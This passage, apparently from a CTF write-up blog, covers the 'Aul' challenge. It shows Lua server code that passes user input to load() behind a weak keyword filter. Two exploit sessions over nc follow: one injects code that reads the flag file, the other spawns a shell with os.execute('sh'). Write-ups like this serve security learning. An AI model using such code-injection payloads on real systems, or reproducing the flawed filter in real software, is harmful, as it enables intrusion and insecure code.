<span class="keyword">then</span></span><br><span class="line">            new_board[dest*size + col] = board[y*size + col]</span><br><span class="line">            dest = dest - <span class="number">1</span></span><br><span class="line">         <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> x=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      fall_column(x)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> dest_col = size - <span class="number">1</span> - y</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         new_board[n*size + dest_col] = board[y*size + n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crush</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">local</span> crushers = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      new_board[n] = board[n]</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = size, size*size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> board[n-size] == crushers[board[n]] <span class="keyword">then</span></span><br><span class="line">         new_board[n] = <span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         new_board[n] = board[n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate_left</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">return</span> rotate(rotate(rotate(board)))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readAll</span><span class="params">(file)</span></span></span><br><span class="line">    <span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> content = f:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    f:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">help</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">local</span> l = <span class="built_in">string</span>.<span class="built_in">sub</span>(readAll(<span class="string">&quot;server.luac&quot;</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        writeraw(l, <span class="built_in">string</span>.<span class="built_in">len</span>(l))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">quit = <span class="literal">false</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exit</span><span class="params">()</span></span></span><br><span class="line">        quit = <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run_step</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> cmd = readline()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">len</span>(cmd) == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">exit</span>()</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">-- prevent injection attacks</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">&quot;function&quot;</span>)) <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">&quot;print&quot;</span>)) <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> f = <span class="built_in">load</span>(<span class="string">&quot;return &quot;</span> .. cmd)()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> f == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> f(board)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span><span class="params">()</span></span></span><br><span class="line">   <span class="keyword">local</span> board = populate_board(make_board(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">repeat</span></span><br><span class="line"></span><br><span class="line">      writeline(board_tostring(board) .. <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> b = run_step(board)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> quit <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> b ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">         board = b</span><br><span class="line">         board = fall(crush(fall(board)))</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         writeline(<span class="string">&quot;Didn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.\n&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">until</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">writeline(<span class="string">&quot;let&#x27;s play a game\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>
+<p>So <code>local f = load(&quot;return &quot; .. cmd)()</code> might be the key part, because we can do code execution here.</p>
+<p>It still has an unexpected solution. Like what we did in <a href="#monkey">monkey</a>, we can also obtain <code>Lua</code> shell directly by <code>os.execute(&#39;/bin/sh&#39;)</code> </p>
+<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>Expected solution on adworld wp:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">load(&#x27;</span>lines = io.lines(<span class="string">&quot;flag&quot;</span>)\n <span class="keyword">for</span> l <span class="keyword">in</span> lines <span class="keyword">do</span> writeline(l) end<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;Didn&#x27;</span>t understand. Type <span class="string">&#x27;rotate&#x27;</span>, <span class="string">&#x27;rotate_left&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, or <span class="string">&#x27;help&#x27;</span>.</span><br></pre></td></tr></table></figure>
+<p>Unexpected solution:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">os.execute(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin</span></span><br><span class="line"><span class="string">dev</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">lib</span></span><br><span class="line"><span class="string">lib64</span></span><br><span class="line"><span class="string">run.sh</span></span><br><span class="line"><span class="string">scripty</span></span><br><span class="line"><span class="string">server.lua</span></span><br><span class="line"><span class="string">server.luac</span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span></span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/10/09/2020-10-09-ADWorld-PWN-Challenge-Area-Write-ups-Advanced-ROP/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Advanced ROP)</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/10/02/2020-10-02-A-Brief-History-of-Fuzzing/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">A Brief History of Fuzzing</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#monkey"><span class="nav-number">2.</span> <span class="nav-text">monkey</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-1"><span class="nav-number">2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secret-file"><span class="nav-number">3.</span> <span class="nav-text">secret_file</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-2"><span class="nav-number">3.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aul"><span class="nav-number">4.</span> <span class="nav-text">Aul</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-3"><span class="nav-number">4.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-3"><span class="nav-number">4.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
